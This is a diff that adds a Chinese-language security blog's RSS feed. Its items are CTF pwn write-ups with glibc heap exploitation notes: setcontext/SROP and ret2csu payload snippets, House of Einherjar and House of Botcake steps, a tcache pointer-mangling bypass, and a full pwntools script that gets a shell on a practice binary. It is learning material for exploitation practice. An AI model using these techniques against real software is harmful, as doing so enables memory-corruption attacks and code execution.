@@ -1,0 +1,289 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Pwn on N0k&#39;s Den</title>
+    <link>https://trident91.github.io/tags/pwn/</link>
+    <description>Recent content in Pwn on N0k&#39;s Den</description>
+    <generator>Hugo -- 0.147.9</generator>
+    <language>en</language>
+    <lastBuildDate>Thu, 20 May 2021 10:05:06 +0000</lastBuildDate>
+    <atom:link href="https://trident91.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pwn Snippet</title>
+      <link>https://trident91.github.io/posts/pwn_snippet/</link>
+      <pubDate>Thu, 20 May 2021 10:05:06 +0000</pubDate>
+      <guid>https://trident91.github.io/posts/pwn_snippet/</guid>
+      <description>&lt;h1 id=&#34;code-snippets-for-pwn&#34;&gt;Code Snippets for Pwn&lt;/h1&gt;
+&lt;p&gt;这里记录一些做CTF pwn题中大概也许可能会复用的代码片段.&lt;/p&gt;
+&lt;h3 id=&#34;magic_gadget--setcontext61-高版本glibc&#34;&gt;magic_gadget + setcontext+61 (高版本glibc)&lt;/h3&gt;
+&lt;p&gt;注1: &lt;code&gt;the_gadget&lt;/code&gt; 即&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   0x154b20:	mov    rdx,QWORD PTR [rdi+0x8]
+   0x154b24:	mov    QWORD PTR [rsp],rax
+   0x154b28:	call   QWORD PTR [rdx+0x20]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SROP+伪造栈帧,按需布置伪栈帧和ROP链即可:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    frame = SigreturnFrame()
+    frame.rax = 0
+    frame.rsp = ROP_address
+    frame.rip = ret
+
+    frame_str = str(frame).ljust(frame_size,&amp;#34;\x00)
+    payload = p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61) + frame_str[0x28:] 
+    payload += .....          #other stuff and ROP chain
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;_io_2_1_stdout_&#34;&gt;_IO_2_1_stdout_&lt;/h3&gt;
+&lt;p&gt;gdb查找语句:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p &amp;amp;_IO_2_1_stdout_
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;覆盖为:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = p64(0xfbad1800)+p64(0x0)*3+&amp;#39;\x00&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ret2csu&#34;&gt;ret2CSU&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;payload = p6r + p64(0) + p64(1) + fuction_ptr\ 
+    + arg3 + arg2 + arg1 + mov_call\
+    + &amp;#34;\x00&amp;#34;*56 + return_address
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    <item>
+      <title>House of Einherjar</title>
+      <link>https://trident91.github.io/posts/house-of-einherjar/</link>
+      <pubDate>Fri, 14 May 2021 10:04:20 +0000</pubDate>
+      <guid>https://trident91.github.io/posts/house-of-einherjar/</guid>
+      <description>&lt;h2 id=&#34;house-of-einherjar&#34;&gt;House Of Einherjar&lt;/h2&gt;
+&lt;p&gt;通过off-by-one/off-by-null, 申请任意地址&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用结果: 使malloc返回任意地址&lt;/li&gt;
+&lt;li&gt;要求: 堆泄露, off-by-null&lt;/li&gt;
+&lt;li&gt;适用版本: 本篇记录的是改进版的House of Einherjar, 适用于包括2.31的带tcache版本.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;利用方式&#34;&gt;利用方式&lt;/h4&gt;
+&lt;p&gt;总结一下, 会用到三个chunk: a,b,c&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;a: 在其中构造fake chunk&lt;/li&gt;
+&lt;li&gt;b: victim, 在其中off-by-null溢出到c, 并修改c的prev_size,与fake chunk重叠&lt;/li&gt;
+&lt;li&gt;c: 被溢出修改prev_size的chunk&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一些细节如下:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;c的chunk大小应为0x100的倍数,这样off-by-null时就不会出问题&lt;/li&gt;
+&lt;li&gt;fake_chunk -&amp;gt; size 要等于 c-&amp;gt; prev_size&lt;/li&gt;
+&lt;li&gt;fake_chunk -&amp;gt; fd, fake_chunk -&amp;gt; bk 都指向fake_chunk, 以绕过unlink时的检查,也因此需要堆泄露&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;流程:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;申请a,b,c&lt;/li&gt;
+&lt;li&gt;在B中改写&lt;code&gt;C-&amp;gt;prev_size&lt;/code&gt;, 同时通过OFF-BY-NULL写&lt;code&gt;C-&amp;gt;prev_inuse&lt;/code&gt;为0&lt;/li&gt;
+&lt;li&gt;填满 &lt;code&gt;tcache[c -&amp;gt; size]&lt;/code&gt;; 当然,情况允许的话,我们也可以直接申请大于tcache范围的chunk.&lt;/li&gt;
+&lt;li&gt;释放c, 触发fake_chunk与c的合并&lt;/li&gt;
+&lt;li&gt;申请fake_chunk+c的chunk, 叫他d&lt;/li&gt;
+&lt;li&gt;桥豆麻袋! 此处需要先&lt;code&gt;malloc&lt;/code&gt;并&lt;code&gt;free&lt;/code&gt;一个b大小的chunk做padding.&lt;/li&gt;
+&lt;li&gt;释放b&lt;/li&gt;
+&lt;li&gt;开始攻击(tcache poisoning): 利用d修改 b-&amp;gt;fd 为target&lt;/li&gt;
+&lt;li&gt;申请两次,第二次申请获取到target!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;参考&#34;&gt;参考&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c&#34;&gt;https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>House of Botcake</title>
+      <link>https://trident91.github.io/posts/house-of-botcake/</link>
+      <pubDate>Fri, 14 May 2021 10:01:07 +0000</pubDate>
+      <guid>https://trident91.github.io/posts/house-of-botcake/</guid>
+      <description>&lt;h2 id=&#34;house-of-botcake&#34;&gt;House of Botcake&lt;/h2&gt;
+&lt;p&gt;2.27中也可使用, 绕过tcache double free的检测.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用结果: 使malloc返回任意地址&lt;/li&gt;
+&lt;li&gt;要求: 存在double free&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;利用方式&#34;&gt;利用方式&lt;/h4&gt;
+&lt;p&gt;使用0x100 (chunk size: 0x110)来演示:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;listTrash = malloc(0x100) * 7&lt;/li&gt;
+&lt;li&gt;prev = malloc(0x100)&lt;/li&gt;
+&lt;li&gt;a = malloc(0x100) # the victim&lt;/li&gt;
+&lt;li&gt;malloc (0x10) #padding&lt;/li&gt;
+&lt;li&gt;free(listTrash[i]) for i in [0,7) # fill up tcachebin&lt;/li&gt;
+&lt;li&gt;free(a)  # free a; a in unsortedbin&lt;/li&gt;
+&lt;li&gt;free(prev) # prev consolidate with a&lt;/li&gt;
+&lt;li&gt;malloc(0x100); # get one chunk from tcache&lt;/li&gt;
+&lt;li&gt;free(a) # free victim again, now it is also in tcachebin&lt;/li&gt;
+&lt;li&gt;malloc(0x120) # 利用重叠申请到prev+victim合并产生的chunk&lt;/li&gt;
+&lt;li&gt;改写victim的fd&lt;/li&gt;
+&lt;li&gt;malloc(0x100) # BOOM!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c&#34;&gt;https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>VNCTF2021 Pwn</title>
+      <link>https://trident91.github.io/posts/vnctf2021/</link>
+      <pubDate>Thu, 08 Apr 2021 16:48:49 +0000</pubDate>
+      <guid>https://trident91.github.io/posts/vnctf2021/</guid>
+      <description>&lt;h6 id=&#34;一点废话&#34;&gt;一点废话&lt;/h6&gt;
+&lt;p&gt;2021年三月某个周日,安排本来是上午运动,下午打这个比赛. 然而篮球斗牛过程中被对手爆了头,昏了一整天,遂将这比赛鸽了&amp;hellip;
+过了一个月,回头看下比赛中的pwn题.&lt;/p&gt;
+&lt;h2 id=&#34;ff&#34;&gt;ff&lt;/h2&gt;
+&lt;p&gt;glibc 2.32, 需要疯狂调试的一道题,令人昏迷.&lt;/p&gt;
+&lt;h3 id=&#34;程序分析&#34;&gt;程序分析&lt;/h3&gt;
+&lt;h4 id=&#34;漏洞&#34;&gt;漏洞&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;free&lt;/code&gt; 后指针未清空.&lt;/p&gt;
+&lt;h4 id=&#34;坑点&#34;&gt;坑点&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;没用数组存储指针, 只能控制上一个&lt;code&gt;malloc()&lt;/code&gt;的chunk&lt;/li&gt;
+&lt;li&gt;能&lt;code&gt;malloc()&lt;/code&gt;的最大大小为0x7F (之后会发现这点把最后利用时使用的size卡的很死)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;show()&lt;/code&gt; 只能用一次, 应该是要打stdout了&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;edit()&lt;/code&gt; 只能用两次&amp;hellip;&lt;/li&gt;
+&lt;li&gt;2.32中, tcache_entry 中的next指针会被&lt;code&gt;PROTECT_PTR&lt;/code&gt;函数异或处理, 使用的mask为其地址&amp;raquo;12.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;思路&#34;&gt;思路&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;利用&lt;code&gt;PROTECT_PTR&lt;/code&gt;:  利用next值为0的chunk, 和&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mask ⊕ 0 = mask
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上这个特性, &lt;code&gt;show()&lt;/code&gt;泄露出 mask. mask存放着 堆地址 &amp;raquo; 12. &lt;code&gt;show()&lt;/code&gt;次数用尽.&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;通过UAF漏洞, &lt;code&gt;edit()&lt;/code&gt;修改&lt;code&gt;tcache_entry&lt;/code&gt;中的key值. &lt;code&gt;tcache_entry&lt;/code&gt;使用用户chunk中的用户数据,key就在所谓bk指针的位置. 修改完key值,就可以绕过检查进行&lt;code&gt;double free()&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;通过&lt;code&gt;edit()&lt;/code&gt;做&lt;code&gt;tcache poisoning&lt;/code&gt;, 劫持到&lt;code&gt;tcache_perthread_struct&lt;/code&gt;. 需注意tcache_entry-&amp;gt;next 指向的是用户数据段, 因此需要劫持的地址需要加上0x10. 还需要用之前泄露出的mask对其做一次异或. &lt;code&gt;edit()&lt;/code&gt;次数用尽.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;edit(p64(mask ^ (heap_base + 0x10))+p64(0))
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;tcache_perthread_struct&lt;/code&gt;大小为0x290, 我们把&lt;code&gt;counts[0x290]&lt;/code&gt;覆盖成大于等于7,就能将其释放到&lt;code&gt;unsortedbin&lt;/code&gt;中.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;非常重要的一点: 记得我们在&lt;code&gt;tcache_perthread_struct&lt;/code&gt;操作, 该chunk进入&lt;code&gt;unsortedbin&lt;/code&gt;中会对&lt;code&gt;counts[]&lt;/code&gt;进行污染,我们要将其清零. 同时,我们也应当为之后的利用&lt;code&gt;entries[]&lt;/code&gt;的操作做准备,设置对应的&lt;code&gt;counts[]&lt;/code&gt;值使其大于零.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;利用&lt;code&gt;unsortedbin&lt;/code&gt;中chunk的分割,将main_arena地址写到&lt;code&gt;entries[目标大小]&lt;/code&gt;中. 通过partial overwrite 打到&lt;code&gt;_IO_2_1_stdout_&lt;/code&gt; (需要爆破,1 / 2^4).&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>简单堆题write-up</title>
+      <link>https://trident91.github.io/posts/heap_writeup/</link>
+      <pubDate>Thu, 04 Mar 2021 11:03:54 +0000</pubDate>
+      <guid>https://trident91.github.io/posts/heap_writeup/</guid>
+      <description>&lt;h2 id=&#34;actf_2019_babyheap&#34;&gt;ACTF_2019_babyheap&lt;/h2&gt;
+&lt;p&gt;经典的notebook题目结构, 堆利用当中最简单的类型&lt;/p&gt;
+&lt;p&gt;有&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
+    ==============================
+    This is a heap exploit demo  
+    ==============================
+    1. Create something           
+    2. Delete something           
+    3. Print something            
+    4. Exit    
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;create, delete, print 三个选项。&lt;/p&gt;
+&lt;p&gt;创建的结构体如下&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;&lt;/th&gt;
+          &lt;th&gt;&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;字符串指针&lt;/td&gt;
+          &lt;td&gt;函数指针&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;字符串也由&lt;code&gt;malloc()&lt;/code&gt;创建，且可以任意指定其长度和内容。
+&lt;code&gt;free()&lt;/code&gt;的时候也没有清空内容。&lt;/p&gt;
+&lt;p&gt;利用思路很明显了：
+create两次，其中字符串的内容不重要，只要保证其释放后不被放入&lt;code&gt;0x20&lt;/code&gt;的fastbin中。&lt;/p&gt;
+&lt;p&gt;此处使这这两个字符串大小为&lt;code&gt;0x20&lt;/code&gt;，因此他们被释放后会被放入&lt;code&gt;0x30&lt;/code&gt;的字符串当中。&lt;/p&gt;
+&lt;p&gt;释放这两个note之后的fastbin如下&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;0x20&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;note0&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;🠗&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;note1&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;0x30&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;String0&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;🠗&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;String1&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    note2 = note1
+    string2 = note0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题目bss段中贴心的准备了&lt;code&gt;/bin/sh&lt;/code&gt;字符串，也有&lt;code&gt;system&lt;/code&gt;函数。
+在create时向string2中写入&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    binsh地址 |  system的PLT表地址
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;print选项调用note0.函数指针，就能成功调用&lt;code&gt;system(&#39;/bin/sh&#39;)&lt;/code&gt;，完整payload如下&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    if len(sys.argv) &amp;gt;1 and sys.argv[1] == &amp;#39;r&amp;#39;:
+        target = remote()
+    else:
+        target = process(&amp;#34;./ACTF_2019_babyheap&amp;#34;)
+        if(len(sys.argv)&amp;gt;1) and sys.argv[1]==&amp;#39;g&amp;#39;:
+            gdb.attach(target)
+
+    context.log_level=&amp;#39;debug&amp;#39;
+
+    binsh=0x602010
+    system_plt = 0x4007A0
+    def s(in_put):
+        target.sendlineafter(&amp;#34;choice: &amp;#34;,in_put)
+        
+        
+    def create(size,content):
+        s(&amp;#34;1&amp;#34;)
+        target.recvuntil(&amp;#34;size: \n&amp;#34;)
+        target.sendline(str(size))
+        target.recvuntil(&amp;#34;content: \n&amp;#34;)
+        target.send(content)
+        
+        
+    def delete(index):
+        s(&amp;#34;2&amp;#34;)
+        target.recvuntil(&amp;#34;index: \n&amp;#34;)
+        target.sendline(str(index))
+        
+        
+    def pwn():
+        create(0x20,&amp;#34;A&amp;#34;*8+&amp;#34;\n&amp;#34;)
+        create(0x20,&amp;#34;B&amp;#34;*8+&amp;#34;\n&amp;#34;)
+        
+        delete(0)
+        delete(1)
+        create(0x10,p64(binsh)+p64(system_plt))
+
+        #use print at index 0 to getshell after this
+
+
+        target.interactive()
+
+
+    pwn()
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h2 id=&#34;wdb_2018_1st_babyheap&#34;&gt;WDB_2018_1st_babyheap&lt;/h2&gt;
+&lt;p&gt;同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
